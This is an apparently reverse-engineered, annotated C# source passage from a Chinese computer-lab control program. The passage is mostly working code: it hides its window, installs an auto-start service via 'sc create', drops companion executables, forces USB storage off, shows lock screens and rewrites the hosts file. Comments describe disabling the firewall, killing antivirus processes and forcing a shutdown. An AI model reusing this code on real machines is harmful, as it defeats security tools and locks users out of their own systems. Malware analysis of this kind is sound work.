using System;
using System.Collections;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Management;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using WindowsApplication1.Internal;

namespace WindowsApplication1
{
	// Token: 0x02000008 RID: 8
	[DesignerGenerated]
	// ============================================================
	// Form1.cs — 恶意软件主控窗体（隐藏主窗体，14 定时器调度全部恶意功能）
	// 核心职责：构造时创建 14 个 System.Windows.Forms.Timer；Load 事件完成配置读取、黑名单初始化、WMI 进程监视器启动、极域服务自检；各定时器分阶段接管：安装 zmserv 服务、禁用 U 盘、守护"电子教室"进程、监控网络/IP、强制关闭防火墙、恢复被篡改的注册表、下载黑名单改写 hosts、封堵 IP 路由、检测并击杀杀毒/进程工具/对抗工具进程。窗体关闭时释放 WMI 监视器。
	// 方法均为函数级反混淆重命名（原名见各方法注释）。
	// ============================================================
	public partial class Form1 : Form
	{
		// Token: 0x0600002B RID: 43 RVA: 0x0000298C File Offset: 0x00000B8C
		/// <summary>
		/// 构造器：挂接 Load(Form1_Load) 与 FormClosing(Form1_FormClosing) 事件；初始化计数、黑名单数组、ServiceController(tdfilefilter/tdnetfilter)、路径等全部字段；最后调用 InitTimersAndForms() 创建 14 个定时器并隐藏窗体。
		/// </summary>
		public Form1()
		{
			base.Load += this.Form1_Load;
			base.FormClosing += this.Form1_FormClosing;
			this.mainTickCounter = 0L;
			this.updateHostsTickCounter = 0L;
			this.classroomProcessList = new string[6];
			this.processNameBlacklist = new string[101];
			this.productDescriptionBlacklist = new string[201];
			this.m_DispatcherVisitor = "";
			this.firewallViolationCount = 0;
			this.networkViolationCount = 0;
			this.valueVisitor = 0;
			this.classroomNotFoundCount = 0;
			this.connectionVisitor = 0L;
			this.jiyuChannelId = 0;
			this.jiyuAutoLogin = 0;
			this.jiyuRegistryBitness = 0;
			this.tencentFileFilterService = new ServiceController("tdfilefilter");
			this.tencentNetFilterService = new ServiceController("tdnetfilter");
			this.jfWorkingDir = "C:\\windows\\jf";
			this.hostsAdopted = false;
			this.hostsFilePath = "C:\\Windows\\System32\\drivers\\etc\\hosts";
			this.processMatchIndex = 0;
			this.descriptorVisitor = new List<string>();
			this.exporterVisitor = new List<string>();
			this._IndexerVisitor = string.Empty;
			this.m_SpecificationVisitor = 0L;
			this.companionLaunchCount = 0L;
			this._DefinitionVisitor = "";
			this._ContainerVisitor = false;
			this.InitTimersAndForms();
		}

		// Token: 0x0600002D RID: 45 RVA: 0x00002B34 File Offset: 0x00000D34
		/// <summary>
		/// 初始化定时器与窗体（原名 ExcludeTemplate）。
		/// 流程：1. new 全部 14 个 Timer 挂到同一 Container(m_RulesConfig→componentsContainer)；2. 逐个设置 Interval（3s/6s/1s/5s/16s/17s/5s/13s/3s/1s/15s/1s/10s/11s）；3. 仅 Timer_main 初始 Enabled=true；4. 窗体无边框、最小化、不在任务栏。
		/// 关键 API：System.Windows.Forms.Timer（属性 setter 内部 Tick += 处理器）。
		/// </summary>
		private void InitTimersAndForms()
		{
			this.componentsContainer = new Container();
			this.Timer1 = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer2 = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_main = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_usb = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_dzjs = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_wangluo = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_jcm = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_fhq = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_qdx = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer4 = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_jiyu = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer3 = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_updatehosts = new System.Windows.Forms.Timer(this.componentsContainer);
			this.Timer_route = new System.Windows.Forms.Timer(this.componentsContainer);
			this.SuspendLayout();
			this.Timer1.Interval = 6000;
			this.Timer2.Interval = 1000;
			this.Timer_main.Enabled = true;
			this.Timer_main.Interval = 3000;
			this.Timer_usb.Interval = 5000;
			this.Timer_dzjs.Interval = 16000;
			this.Timer_wangluo.Interval = 17000;
			this.Timer_jcm.Interval = 5000;
			this.Timer_fhq.Interval = 13000;
			this.Timer_qdx.Interval = 3000;
			this.Timer4.Interval = 1000;
			this.Timer_jiyu.Interval = 15000;
			this.Timer3.Interval = 1000;
			this.Timer_updatehosts.Interval = 10000;
			this.Timer_route.Interval = 11000;
			SizeF autoScaleDimensions = new SizeF(6f, 12f);
			this.AutoScaleDimensions = autoScaleDimensions;
			this.AutoScaleMode = AutoScaleMode.Font;
			Size clientSize = new Size(384, 379);
			this.ClientSize = clientSize;
			this.FormBorderStyle = FormBorderStyle.None;
			this.Name = "Form1";
			this.ShowInTaskbar = false;
			this.WindowState = FormWindowState.Minimized;
			this.ResumeLayout(false);
		}

		// Token: 0x1700000A RID: 10
		// (get) Token: 0x0600002E RID: 46 RVA: 0x00002D8C File Offset: 0x00000F8C
		// (set) Token: 0x0600002F RID: 47 RVA: 0x00002DA0 File Offset: 0x00000FA0
		/// <summary>
		/// 定时器 Timer1（6000ms）：Tick 处理器为 Timer1Tick_InstallZmservAndCompanion —— 安装/重启 zmserv 服务并启动同伴进程 przs。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer1
		{
			get
			{
				return this.Timer1BackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Timer1Tick_InstallZmservAndCompanion);
				if (this.Timer1BackingField != null)
				{
					this.Timer1BackingField.Tick -= value2;
				}
				this.Timer1BackingField = value;
				if (this.Timer1BackingField != null)
				{
					this.Timer1BackingField.Tick += value2;
				}
			}
		}

		// Token: 0x1700000B RID: 11
		// (get) Token: 0x06000030 RID: 48 RVA: 0x00002DEC File Offset: 0x00000FEC
		// (set) Token: 0x06000031 RID: 49 RVA: 0x00002E00 File Offset: 0x00001000
		/// <summary>
		/// 定时器 Timer2（1000ms）：Tick 处理器为 Timer2Tick_ShowLockForm2 —— 强制弹出全屏锁定窗 Form2。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer2
		{
			get
			{
				return this.Timer2BackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Timer2Tick_ShowLockForm2);
				if (this.Timer2BackingField != null)
				{
					this.Timer2BackingField.Tick -= value2;
				}
				this.Timer2BackingField = value;
				if (this.Timer2BackingField != null)
				{
					this.Timer2BackingField.Tick += value2;
				}
			}
		}

		// Token: 0x1700000C RID: 12
		// (get) Token: 0x06000032 RID: 50 RVA: 0x00002E4C File Offset: 0x0000104C
		// (set) Token: 0x06000033 RID: 51 RVA: 0x00002E60 File Offset: 0x00001060
		/// <summary>
		/// 定时器 Timer_main（3000ms）：Tick 处理器为 TimerMainTick_MainScheduler —— 主调度/启动序列，按计数分阶段启用其它定时器。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_main
		{
			get
			{
				return this.TimerMainBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerMainTick_MainScheduler);
				if (this.TimerMainBackingField != null)
				{
					this.TimerMainBackingField.Tick -= value2;
				}
				this.TimerMainBackingField = value;
				if (this.TimerMainBackingField != null)
				{
					this.TimerMainBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x1700000D RID: 13
		// (get) Token: 0x06000034 RID: 52 RVA: 0x00002EAC File Offset: 0x000010AC
		// (set) Token: 0x06000035 RID: 53 RVA: 0x00002EC0 File Offset: 0x000010C0
		/// <summary>
		/// 定时器 Timer_usb（5000ms）：Tick 处理器为 TimerUsbTick_DisableUsbStorage —— U 盘禁用检测。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_usb
		{
			get
			{
				return this.TimerUsbBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerUsbTick_DisableUsbStorage);
				if (this.TimerUsbBackingField != null)
				{
					this.TimerUsbBackingField.Tick -= value2;
				}
				this.TimerUsbBackingField = value;
				if (this.TimerUsbBackingField != null)
				{
					this.TimerUsbBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x1700000E RID: 14
		// (get) Token: 0x06000036 RID: 54 RVA: 0x00002F0C File Offset: 0x0000110C
		// (set) Token: 0x06000037 RID: 55 RVA: 0x00002F20 File Offset: 0x00001120
		/// <summary>
		/// 定时器 Timer_dzjs（16000ms）：Tick 处理器为 TimerDzjsTick_GuardClassroom —— 电子教室进程守护。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_dzjs
		{
			get
			{
				return this.TimerDzjsBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerDzjsTick_GuardClassroom);
				if (this.TimerDzjsBackingField != null)
				{
					this.TimerDzjsBackingField.Tick -= value2;
				}
				this.TimerDzjsBackingField = value;
				if (this.TimerDzjsBackingField != null)
				{
					this.TimerDzjsBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000038 RID: 56 RVA: 0x00002F6C File Offset: 0x0000116C
		// (set) Token: 0x06000039 RID: 57 RVA: 0x00002F80 File Offset: 0x00001180
		/// <summary>
		/// 定时器 Timer_wangluo（17000ms）：Tick 处理器为 TimerWangluoTick_MonitorNetwork —— 网络/IP 监控。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_wangluo
		{
			get
			{
				return this.TimerWangluoBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerWangluoTick_MonitorNetwork);
				if (this.TimerWangluoBackingField != null)
				{
					this.TimerWangluoBackingField.Tick -= value2;
				}
				this.TimerWangluoBackingField = value;
				if (this.TimerWangluoBackingField != null)
				{
					this.TimerWangluoBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600003A RID: 58 RVA: 0x00002FCC File Offset: 0x000011CC
		// (set) Token: 0x0600003B RID: 59 RVA: 0x000021DC File Offset: 0x000003DC
		/// <summary>
		/// 定时器 Timer_jcm（5000ms）：死定时器 —— setter 不订阅 Tick 事件，无任何处理器（混淆/开发残留）。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_jcm
		{
			get
			{
				return this.TimerJcmBackingField;
			}
			set
			{
				this.TimerJcmBackingField = value;
			}
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x0600003C RID: 60 RVA: 0x00002FE0 File Offset: 0x000011E0
		// (set) Token: 0x0600003D RID: 61 RVA: 0x00002FF4 File Offset: 0x000011F4
		/// <summary>
		/// 定时器 Timer_fhq（13000ms）：Tick 处理器为 TimerFhqTick_DisableFirewall —— 防火墙监控与强制关闭。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_fhq
		{
			get
			{
				return this.TimerFhqBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerFhqTick_DisableFirewall);
				if (this.TimerFhqBackingField != null)
				{
					this.TimerFhqBackingField.Tick -= value2;
				}
				this.TimerFhqBackingField = value;
				if (this.TimerFhqBackingField != null)
				{
					this.TimerFhqBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x17000012 RID: 18
		// (get) Token: 0x0600003E RID: 62 RVA: 0x00003040 File Offset: 0x00001240
		// (set) Token: 0x0600003F RID: 63 RVA: 0x00003054 File Offset: 0x00001254
		/// <summary>
		/// 定时器 Timer_qdx（3000ms）：Tick 处理器为 TimerQdxTick_ProtectRegistry —— 注册表保护（主密码/自启动项）。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_qdx
		{
			get
			{
				return this.TimerQdxBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerQdxTick_ProtectRegistry);
				if (this.TimerQdxBackingField != null)
				{
					this.TimerQdxBackingField.Tick -= value2;
				}
				this.TimerQdxBackingField = value;
				if (this.TimerQdxBackingField != null)
				{
					this.TimerQdxBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x17000013 RID: 19
		// (get) Token: 0x06000040 RID: 64 RVA: 0x000030A0 File Offset: 0x000012A0
		// (set) Token: 0x06000041 RID: 65 RVA: 0x000030B4 File Offset: 0x000012B4
		/// <summary>
		/// 定时器 Timer4（1000ms）：Tick 处理器为 Timer4Tick_ShowLockForm4 —— 强制弹出二级密码锁定窗 Form4。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer4
		{
			get
			{
				return this.Timer4BackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.Timer4Tick_ShowLockForm4);
				if (this.Timer4BackingField != null)
				{
					this.Timer4BackingField.Tick -= value2;
				}
				this.Timer4BackingField = value;
				if (this.Timer4BackingField != null)
				{
					this.Timer4BackingField.Tick += value2;
				}
			}
		}

		// Token: 0x17000014 RID: 20
		// (get) Token: 0x06000042 RID: 66 RVA: 0x00003100 File Offset: 0x00001300
		// (set) Token: 0x06000043 RID: 67 RVA: 0x00003114 File Offset: 0x00001314
		/// <summary>
		/// 定时器 Timer_jiyu（15000ms）：Tick 处理器为 TimerJiyuTick_MonitorJiyu —— 极域电子教室参数与服务监控。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_jiyu
		{
			get
			{
				return this.TimerJiyuBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerJiyuTick_MonitorJiyu);
				if (this.TimerJiyuBackingField != null)
				{
					this.TimerJiyuBackingField.Tick -= value2;
				}
				this.TimerJiyuBackingField = value;
				if (this.TimerJiyuBackingField != null)
				{
					this.TimerJiyuBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x17000015 RID: 21
		// (get) Token: 0x06000044 RID: 68 RVA: 0x00003160 File Offset: 0x00001360
		// (set) Token: 0x06000045 RID: 69 RVA: 0x000021E5 File Offset: 0x000003E5
		/// <summary>
		/// 定时器 Timer3（1000ms）：死定时器 —— setter 不订阅 Tick 事件，无任何处理器（混淆/开发残留）。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer3
		{
			get
			{
				return this.Timer3BackingField;
			}
			set
			{
				this.Timer3BackingField = value;
			}
		}

		// Token: 0x17000016 RID: 22
		// (get) Token: 0x06000046 RID: 70 RVA: 0x00003174 File Offset: 0x00001374
		// (set) Token: 0x06000047 RID: 71 RVA: 0x00003188 File Offset: 0x00001388
		/// <summary>
		/// 定时器 Timer_updatehosts（10000ms）：Tick 处理器为 TimerUpdateHostsTick_UpdateHosts —— 重新下载 hmd_net.txt 更新 hosts。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_updatehosts
		{
			get
			{
				return this.TimerUpdateHostsBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerUpdateHostsTick_UpdateHosts);
				if (this.TimerUpdateHostsBackingField != null)
				{
					this.TimerUpdateHostsBackingField.Tick -= value2;
				}
				this.TimerUpdateHostsBackingField = value;
				if (this.TimerUpdateHostsBackingField != null)
				{
					this.TimerUpdateHostsBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x17000017 RID: 23
		// (get) Token: 0x06000048 RID: 72 RVA: 0x000031D4 File Offset: 0x000013D4
		// (set) Token: 0x06000049 RID: 73 RVA: 0x000031E8 File Offset: 0x000013E8
		/// <summary>
		/// 定时器 Timer_route（11000ms）：Tick 处理器为 TimerRouteTick_ProtectIfeo —— IFEO route.exe 键保护。
		/// </summary>
		internal virtual System.Windows.Forms.Timer Timer_route
		{
			get
			{
				return this.TimerRouteBackingField;
			}
			set
			{
				EventHandler value2 = new EventHandler(this.TimerRouteTick_ProtectIfeo);
				if (this.TimerRouteBackingField != null)
				{
					this.TimerRouteBackingField.Tick -= value2;
				}
				this.TimerRouteBackingField = value;
				if (this.TimerRouteBackingField != null)
				{
					this.TimerRouteBackingField.Tick += value2;
				}
			}
		}

		// Token: 0x0600004A RID: 74
		[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：user32.ShowWindow —— 窗口显示控制（声明未调用，混淆残留）。
		/// </summary>
		private static extern bool ShowWindow(IntPtr intptr_0, int int_0);

		// Token: 0x0600004B RID: 75
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：kernel32.GetDriveTypeA —— 获取驱动器类型（声明未调用，U 盘类型检测残留）。
		/// </summary>
		private static extern long GetDriveTypeA([MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0);

		// Token: 0x0600004C RID: 76
		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：ntdll.NtSuspendProcess —— 挂起进程（声明未调用，混淆残留）。
		/// </summary>
		private static extern int NtSuspendProcess(IntPtr intptr_0);

		// Token: 0x0600004D RID: 77
		[DllImport("ntdll.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：ntdll.NtResumeProcess —— 恢复进程（声明未调用，混淆残留）。
		/// </summary>
		private static extern int NtResumeProcess(IntPtr intptr_0);

		// Token: 0x0600004E RID: 78
		[DllImport("ntdll.dll")]
		/// <summary>
		/// P/Invoke：ntdll.RtlAdjustPrivilege —— 调整进程特权（ForceShutdown 中启用 SE_SHUTDOWN_PRIVILEGE=19）。
		/// </summary>
		private static extern int RtlAdjustPrivilege(int int_0, int int_1, int int_2, ref int int_3);

		// Token: 0x0600004F RID: 79
		[DllImport("ntdll.dll")]
		/// <summary>
		/// P/Invoke：ntdll.NtShutdownSystem —— 直接关机（ForceShutdown 中传 2=PowerOff）。
		/// </summary>
		private static extern int NtShutdownSystem(int int_0);

		// Token: 0x06000050 RID: 80
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：user32.SetForegroundWindow —— 置前台窗口（声明未调用，混淆残留）。
		/// </summary>
		private static extern bool SetForegroundWindow(IntPtr intptr_0);

		// Token: 0x06000051 RID: 81
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：user32.GetForegroundWindow —— 取前台窗口句柄（声明未调用，混淆残留）。
		/// </summary>
		private static extern IntPtr GetForegroundWindow();

		// Token: 0x06000052 RID: 82
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：user32.GetWindowTextA —— 读窗口标题（声明未调用，混淆残留）。
		/// </summary>
		private static extern int GetWindowTextA(IntPtr intptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0);

		// Token: 0x06000053 RID: 83
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：user32.GetWindowThreadProcessId —— 取窗口所属进程（声明未调用，混淆残留）。
		/// </summary>
		private static extern int GetWindowThreadProcessId(IntPtr intptr_0, ref int int_0);

		// Token: 0x06000054 RID: 84
		[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		/// <summary>
		/// P/Invoke：user32.keybd_event —— 模拟键盘输入（声明未调用，混淆残留）。
		/// </summary>
		private static extern void keybd_event(byte byte_0, byte byte_1, int int_0, int int_1);

		// Token: 0x06000055 RID: 85
		[DllImport("user32.dll")]
		/// <summary>
		/// P/Invoke：user32.BlockInput —— 屏蔽鼠标键盘输入（声明未调用，混淆残留）。
		/// </summary>
		private static extern bool BlockInput(bool bool_0);

		// Token: 0x06000056 RID: 86 RVA: 0x00003234 File Offset: 0x00001434
		/// <summary>
		/// Timer_main.Tick·主调度（原名 FlushTemplate）。
		/// 流程：1. 计数+1；2. 读 HKCU\Software\jfglzs\zhuye 得服务器地址；3. UpdateHostsBlacklistAndRouteBlock("http://<zhuye>/hmd_net.txt","on") 下载黑名单写 hosts；4. hosts 备份为 hosts2（先去只读属性）；5. hosts 未接管(hostsAdopted=false)则启用 Timer_updatehosts；6. 计数==2：密码/自启动项非空→启用 Timer_qdx，usb_jianche=="on"→启用 Timer_usb；7. 计数==7：启用 Timer_fhq+Timer1；8. 计数==10：启用 Timer_wangluo，且电子教室进程 NotFound 时从 xxx.exe2 副本恢复并启动；9. 计数==12：进程存在则启用 Timer_dzjs，随后 Timer_main.Enabled=false（启动序列结束）。
		/// 说明：IL 状态机（num2=常数 + @switch）仅为 VB 异常处理外壳，真实逻辑如上。
		/// </summary>
		private void TimerMainTick_MainScheduler(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~110 行 → 还原为正常 if/else 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				checked
				{
					this.mainTickCounter += 1L;
					this.serverHostname = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "zhuye", ""));
					this.UpdateHostsBlacklistAndRouteBlock("http://" + this.serverHostname + "/hmd_net.txt", "on");
					File.SetAttributes(this.hostsFilePath + "2", FileAttributes.Normal);
					File.Copy(this.hostsFilePath, this.hostsFilePath + "2", true);
					// hosts 尚未被接管 → 启用 hosts 周期更新定时器
					if (!this.hostsAdopted)
					{
						this.Timer_updatehosts.Enabled = true;
					}
					// 启动序列：按 tick 计数分阶段启用功能定时器
					if (this.mainTickCounter == 2L)
					{
						// 主密码与自启动项均已配置 → 启用注册表保护
						if (this.masterPasswordHash != "" & this.runKeyProzsValue != "" & this.runKeyJfglzsnValue != "")
						{
							this.Timer_qdx.Enabled = true;
						}
						// U 盘检测开关为 "on" → 启用 U 盘禁用定时器
						string usbCheck = Conversions.ToString(ModelVisitor.ReadRegistryValue(Registry.CurrentUser, "Software\\jfglzs", "usb_jianche", ""));
						if (usbCheck == "on")
						{
							this.Timer_usb.Enabled = true;
						}
					}
					else if (this.mainTickCounter == 7L)
					{
						this.Timer_fhq.Enabled = true;
						this.Timer1.Enabled = true;
					}
					else if (this.mainTickCounter == 10L)
					{
						this.Timer_wangluo.Enabled = true;
						// 电子教室进程不存在 → 从 .exe2 副本恢复并重新拉起
						if (this.CheckProcessStatus(this.classroomProcessName) == Form1.ProcessStatus.NotFound)
						{
							if (!File.Exists(this.classroomProcessPath))
							{
								this.backupFilePath = this.classroomProcessPath + "2";
								File.Copy(this.backupFilePath, this.classroomProcessPath);
							}
							Process.Start(this.classroomProcessPath);
						}
					}
					else if (this.mainTickCounter == 12L)
					{
						if (this.CheckProcessStatus(this.classroomProcessName) != Form1.ProcessStatus.NotFound)
						{
							this.Timer_dzjs.Enabled = true;
						}
						this.Timer_main.Enabled = false;
					}
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x06000057 RID: 87 RVA: 0x000021EE File Offset: 0x000003EE
		/// <summary>
		/// Timer2.Tick（原名 DisableTemplate）：Form2 不可见时调用 MyForms.Form2.Show() 强制弹出全屏锁定窗。
		/// </summary>
		private void Timer2Tick_ShowLockForm2(object sender, EventArgs e)
		{
			if (!TokenizerConfig.MyForms.Form2.Visible)
			{
				TokenizerConfig.MyForms.Form2.Show();
			}
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00003648 File Offset: 0x00001848
		/// <summary>
		/// Timer1.Tick·安装 zmserv 服务与启动同伴（原名 InterruptTemplate）。
		/// 流程：1. 若 zmserv 进程已在跑→跳过；2. 无 zmserv.exe 且存在 C:\windows\jf\zmserv.dat→复制为启动目录\zmserv.exe；3. DisableCMD=0（放开 cmd）；4. sc create zmserv binPath= <启动目录\zmserv.exe> start= auto；5. net start zmserv；6. 检查随机名同伴进程（ModelVisitor.randomProcessName）不在→计数+1、释放 przs.dat→przs.exe 并启动；7. 计数≥5：net stop zmserv→Sleep 3s→重建服务并启动→启动 jfglzsn.exe 自重启→EndApp 结束当前进程。
		/// 关键 API：Interaction.Shell("sc create/net start/net stop")、File.Copy、Process.Start、ProjectData.EndApp。
		/// </summary>
		private void Timer1Tick_InstallZmservAndCompanion(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~110 行 → 还原为正常 if 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				// 1. zmserv 服务未在跑 → 释放 zmserv.exe 并创建/启动自启服务
				if (!this.CheckProcessExists("zmserv"))
				{
					// 启动目录无 zmserv.exe 且 C:\windows\jf 存在 zmserv.dat → 复制释放
					if (!File.Exists(Application.StartupPath + "\\zmserv.exe") && File.Exists(this.jfWorkingDir + "\\zmserv.dat"))
					{
						File.Copy(this.jfWorkingDir + "\\zmserv.dat", Application.StartupPath + "\\zmserv.exe");
					}
					// 放开 cmd 限制，注册自启服务并启动
					ModelVisitor.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
					string zmservPath = Application.StartupPath + "\\zmserv.exe";
					Interaction.Shell("sc create zmserv binPath= " + zmservPath + " start= auto", AppWinStyle.Hide, true, -1);
					Interaction.Shell("net start zmserv", AppWinStyle.Hide, true, -1);
				}
				// 2. 随机名同伴进程未在跑 → 释放 przs.exe 并启动
				if (!this.CheckProcessExists(Conversions.ToString(ModelVisitor.randomProcessName)))
				{
					checked
					{
						this.companionLaunchCount += 1L;
					}
					// 启动目录无 przs.exe 且 C:\windows\jf 存在 przs.dat → 复制释放
					if (!File.Exists(Application.StartupPath + "\\przs.exe") && File.Exists(this.jfWorkingDir + "\\przs.dat"))
					{
						File.Copy(this.jfWorkingDir + "\\przs.dat", Application.StartupPath + "\\przs.exe");
					}
					Process.Start(Application.StartupPath + "\\przs.exe");
					// 3. 连续 5 次未检测到同伴进程 → 重建 zmserv 服务并自重启
					if (this.companionLaunchCount >= 5L)
					{
						ModelVisitor.WriteRegistryValue(Registry.CurrentUser, "Software\\Policies\\Microsoft\\Windows\\System", "DisableCMD", 0, RegistryValueKind.DWord);
						Interaction.Shell("net stop zmserv", AppWinStyle.Hide, true, -1);
						Thread.Sleep(3000);
						string zmservPath2 = Application.StartupPath + "\\zmserv.exe";
						Interaction.Shell("sc create zmserv binPath= " + zmservPath2 + " start= auto", AppWinStyle.Hide, true, -1);
						Interaction.Shell("net start zmserv", AppWinStyle.Hide, true, -1);
						Process.Start(Application.StartupPath + "\\jfglzsn.exe");
						ProjectData.EndApp();
					}
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x06000059 RID: 89 RVA: 0x000039A4 File Offset: 0x00001BA4
		/// <summary>
		/// Timer_usb.Tick·U 盘禁用（原名 NewTemplate）。
		/// 流程：1. 读 HKLM\SYSTEM\CurrentControlSet\Services\usbstor\Start；2. ==3（手动）→写 4（禁用），并同时写 ControlSet001/002/003；3. Form2 提示"你修改注册表企图使用U盘！请重新启动电脑。"并 Show；4. 启用 Timer2 持续强制显示 Form2。
		/// </summary>
		private void TimerUsbTick_DisableUsbStorage(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~50 行 → 还原为正常 if 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				// 读 usbstor 驱动启动类型：3=手动
				int usbStorageStart = Conversions.ToInteger(ModelVisitor.ReadRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", ""));
				if (usbStorageStart == 3)
				{
					// 改回 4=禁用，并同步写入三个 ControlSet
					ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\CurrentControlSet\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet001\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet002\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					ModelVisitor.WriteRegistryValue(Registry.LocalMachine, "SYSTEM\\ControlSet003\\Services\\usbstor", "Start", 4, RegistryValueKind.DWord);
					// 弹锁屏警告并启用 Timer2 持续强制显示
					TokenizerConfig.MyForms.Form2.shuoming.Text = "你修改注册表企图使用U盘！请重新启动电脑。";
					TokenizerConfig.MyForms.Form2.Show();
					this.Timer2.Enabled = true;
				}
			}
			catch (Exception ex)
			{
				// 原 VB On Error 样板：异常忽略，继续下一块
			}
		}

		// Token: 0x0600005A RID: 90 RVA: 0x00003B40 File Offset: 0x00001D40
		/// <summary>
		/// Timer_dzjs.Tick·电子教室进程守护（原名 ResetTemplate）。
		/// 流程（按 classroomGuardMode）：模式0→关闭本定时器；模式1→逐个检查 classroomProcessList 中进程名，不在则报"电子教室进程未找到或本地连接IP地址错误！"并锁屏；模式2→用 CheckProcessStatus 监控 classroomProcessName：Running→复位计数并关警告窗；Suspended/NotResponding→classroomPausedCount+1（>8 警告"电子教室程序被暂停！"，>10 锁屏）；NotFound→恢复 classroomProcessPath 的 .exe2 副本并启动、classroomNotFoundCount+1，≥5 次直接 ForceShutdown()+shutdown /s /f /t 0。
		/// </summary>
		private void TimerDzjsTick_GuardClassroom(object sender, EventArgs e)
		{
			// [反混淆] 原状态机 ~170 行 → 还原为正常 if/switch/循环 控制流（VB On Error 样板 → try-catch 忽略异常）
			try
			{
				// 模式0：无守护 → 停用本定时器
				if (this.classroomGuardMode == 0)
				{
					this.Timer_dzjs.Enabled = false;
					return;
				}
				// 模式1：进程名列表守护（列表中任一进程缺失 → 锁屏提示）
